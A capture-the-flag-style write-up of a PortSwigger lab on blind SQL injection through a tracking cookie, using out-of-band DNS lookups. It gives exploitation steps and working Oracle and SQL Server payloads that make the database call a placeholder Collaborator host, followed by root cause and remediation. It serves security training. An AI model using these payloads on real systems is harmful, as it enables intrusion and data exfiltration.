# SQL Injection: Blind SQL Injection with Out-of-Band Interaction

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
SQL Injection (SQLi) – Blind SQL Injection (Out-of-Band)

## Lab Objective
Exploit a blind SQL injection vulnerability in the application's tracking cookie to trigger an out-of-band DNS lookup to Burp Collaborator.

The objective is to demonstrate that SQL injection can be exploited even when query results, errors, and execution-time differences are not observable in the application's HTTP response.

## Vulnerability Overview
Blind SQL injection occurs when an application is vulnerable to SQL injection but does not directly expose the results of injected queries.

In this lab, the application uses a tracking cookie for analytics and incorporates its value into an SQL query without proper parameterization.

The SQL query executes asynchronously and does not affect the application's HTTP response. However, the vulnerability can still be exploited using out-of-band (OAST) techniques.

Out-of-band SQL injection involves forcing the database server to communicate with an external system controlled by the attacker.

In this lab, an injected SQL statement triggers a DNS lookup to a unique Burp Collaborator domain. The resulting DNS interaction confirms that the injected SQL statement was executed successfully.

## Methodology
1. Reconnaissance of application cookies and HTTP requests.
2. Identifying the `TrackingId` cookie as the vulnerable input.
3. Intercepting requests using Burp Suite Proxy.
4. Sending the request to Burp Suite Repeater.
5. Generating a unique Burp Collaborator payload.
6. Injecting a database-specific DNS lookup payload.
7. Monitoring Burp Collaborator for incoming DNS interactions.
8. Verifying successful out-of-band communication.

## Exploitation Steps
1. Open the lab and browse the application.
2. Launch Burp Suite and navigate to Proxy → HTTP history.
3. Locate a request containing the `TrackingId` cookie.
4. Send the request to Burp Suite Repeater.
5. Open the Burp Collaborator tab.
6. Generate a unique Collaborator payload using the Copy to clipboard option.
7. Modify the `TrackingId` cookie to include an SQL injection payload that triggers a DNS lookup to the Collaborator domain.
8. Send the modified request using Burp Suite Repeater.
9. Return to the Collaborator tab and click Poll now.
10. Inspect the received interactions and identify the DNS lookup generated by the database server.
11. Verify that the interaction originated from the injected SQL statement.
12. Confirm that the lab is marked as solved.

## Payloads

**Out-of-band DNS lookup payload (Oracle):**
```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(
    xmltype('<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-ID">
    %remote;]>'),
    '/l'
) FROM dual--
```

**Alternative DNS interaction payload (Microsoft SQL Server):**
```sql
'; exec master..xp_dirtree '//YOUR-COLLABORATOR-ID/a'--
```

**Note:** Replace `YOUR-COLLABORATOR-ID` with the unique domain generated by Burp Collaborator. The exact payload depends on the database platform and supported network interaction functions.

## Root Cause
The vulnerability exists because the application directly incorporates an untrusted tracking cookie into dynamically constructed SQL queries.

The absence of parameterized queries allows attackers to inject additional SQL statements.

Although the application does not expose query results or errors, the database can still perform external network interactions through injected SQL functions.

This creates an out-of-band communication channel that allows attackers to confirm SQL injection and potentially extract sensitive information.

## Remediation
- Use parameterized queries and prepared statements.
- Never concatenate untrusted cookie values directly into SQL statements.
- Restrict database server access to external network resources.
- Disable unnecessary database functions that allow outbound network interactions.
- Apply the principle of least privilege to database accounts.
- Implement strict server-side input validation.
- Monitor unexpected DNS requests and outbound connections originating from database servers.
- Avoid exposing unnecessary database functionality to application users.
